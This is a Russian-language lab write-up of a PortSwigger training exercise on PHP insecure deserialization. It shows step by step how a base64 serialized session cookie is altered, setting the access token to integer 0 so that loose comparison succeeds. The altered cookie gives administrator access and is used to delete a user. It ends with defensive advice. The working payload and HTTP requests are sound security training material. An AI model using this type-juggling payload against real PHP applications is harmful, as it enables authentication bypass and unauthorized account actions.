### Изменение типов данных

до PHP 8 :

in PHP можно вот так менять типы данных 5 == "5" это будет true

 `5 == "5 of something"` на практике рассматривается как `5 == 5`

`0 == "Example string"` переводится  в `true`


PHP 8 и следующие версии соврнменные

`0 == "Example string"`считают как `false`

но вот даже в PHP8
`5 == "5 of something"` все равно тоже самое что и `5 == 5`

--------

лаба  https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types
#### Изменение сериализованных типов данных
задание:
получить доступ к administrator и удалить карлоса
тут используется PHP 7

------




вот запрос моей страницы (уже залогинен)

```http
GET /my-account?id=wiener HTTP/2
Host: 0ae9006f03a1da1d88686e95005d002e.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJxNWVnYm00MGdsc2NjeG1tejFtNTRob21nY3NlemxlMSI7fQ%3d%3d
Cache-Control: max-age=0
```

session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJxNWVnYm00MGdsc2NjeG1tejFtNTRob21nY3NlemxlMSI7fQ%3d%3d

это

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"q5egbm40glsccxmmz1m54homgcsezle1";}

может достаточно будет подставить вместо юзер администратора 
а где токен сделать сравнение которое вернет тру ?

-----------------

#### естественно , я все эти пейлоады ниже кодирую в base64

-----
вот так?

O:4:"User":2:{s:8:"username";s:13:"Administrator";s:12:"access_token";s:34:1="q5egbm40glsccxmmz1m54homgcsezle1";}


ответ ошибка 

PHP Fatal error:  Uncaught Exception: unserialize() failed in /var/www/index.php:4
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 4


перепробовал разные варианты
подставлять админа и там и тут (конечно же меняю и число символов)


------------
пробую

O:4:"User":2:{s:8:"username";s:13:"Administrator";s:12:"access_token";s:5:5="5";}

ответ

PHP Fatal error:  Uncaught Exception: unserialize() failed in /var/www/index.php:4
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 4

--------



------------
пробую

O:4:"User":2:{s:8:"username";s:13:"Administrator";s:12:"access_token";s:6:5 == "5";}

ответ

PHP Fatal error:  Uncaught Exception: unserialize() failed in /var/www/index.php:4
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 4

--------



пробую

O:4:"User":2:{s:8:"username";s:13:"Administrator";s:12:"access_token";s:6:5 == "5";}

буква s  - стринг
можно поменять s на i 
буква i интеджер

вот так 

O:4:"User":2:{s:8:"username";s:13:"Administrator";s:12:"access_token";i:0;}

ответ

PHP Fatal error:  Uncaught Exception: Invalid user Administrator in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7

теперь ошибка в 7 а не 4 строке )
то я продвинулся чуть дальше

ошибка говорит мне  Invalid user Administrator
типо юзер не тот...

-------

пробую с мелкой буквы

O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9

ответ поменялся 302!!

пробую:

ответ просто 
HTTP/2 302 Found
Location: /login
X-Frame-Options: SAMEORIGIN
Content-Length: 0


----
я пробовал GET /my-account?id=wiener HTTP/2
```http
Host: 0ae9006f03a1da1d88686e95005d002e.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
Cache-Control: max-age=0
```

поменял на админа

```http
GET /my-account?id=administrator HTTP/2
Host: 0ae9006f03a1da1d88686e95005d002e.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
Cache-Control: max-age=0
```

и вуаля! получил доступ!

![[fffffdesere49f7ue803033.png]]

копирую путь (в html но можно и в браузере с кнопки скопироватть)

```html
<a href="/admin">Admin panel</a>
```

перехожу

```http
GET /admin HTTP/2
Host: 0ae9006f03a1da1d88686e95005d002e.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

попадаю в админку

![[daadmin04deser.png]]

вот методы удаления юзеров (пути)

```html
</span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

/admin/delete?username=carlos


отправляю
```http
GET /admin/delete?username=carlos HTTP/2
Host: 0ae9006f03a1da1d88686e95005d002e.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae9006f03a1da1d88686e95005d002e.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

⭐️ ЛАБА РЕШЕНА!


-----

как решил?

вот ориг обьект

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"q5egbm40glsccxmmz1m54homgcsezle1";}
```

вот так я его поменял

буква s это стринг
буква i  это инт

я подставил инт вместо строк типа

вот это s:32:"q5egbm40glsccxmmz1m54homgcsezle1" 
на это    i:0
ну а число символов не нужно - так как это инт

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```


--------


## как защититься от php object injection

никогда не десериализовать данные от пользователя, это главное правило, если нельзя избежать — использовать цифровую подпись hmac чтобы убедиться что объект не подменили

использовать топ современную версию PHP

всегда использовать строгое сравнение `===` вместо `==` для проверки токенов и паролей, чтобы тип данных имел значение

не хранить токен куй пойми как и где на клиенте